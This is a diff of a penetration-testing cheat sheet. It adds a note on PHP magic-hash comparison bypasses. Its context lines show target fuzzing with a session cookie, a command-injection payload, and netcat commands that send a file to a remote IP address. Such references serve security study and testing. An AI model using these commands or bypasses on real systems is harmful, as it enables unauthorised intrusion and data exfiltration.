@@ -61,6 +61,10 @@ Subdomain fuzz, filter responses to 3 words
 	ffuf -u http://targeturl.com/FUZZ -w /wordlist.txt -b "PHPSESSID=33ptqlqcbf3odc4a9e0l1qa65d"
 Fuzz with cookie  
 
+### Magic hashes
+PHP Loose comparison with magic hashes (0e...)  
+Set inputs to 0
+
 ## Injections
 ### Commands injections
 	...; id #
@@ -205,13 +209,13 @@ LSADump
 Convert file into clipboard contents  
 
 	echo -n 'base64code' | base64 -d > filename
-Save clipboard into file
+Save clipboard into file  
 
 	nc -l -p 8000 --recv-only > filename
 Save nc contents on port 8000 into filename  
 
 	nc --send-only 123.123.123.123 8000 < filename
-Send filename contents into target port 8000 over nc
+Send filename contents into target port 8000 over nc  
 
 ## Linux - directory
 	tree
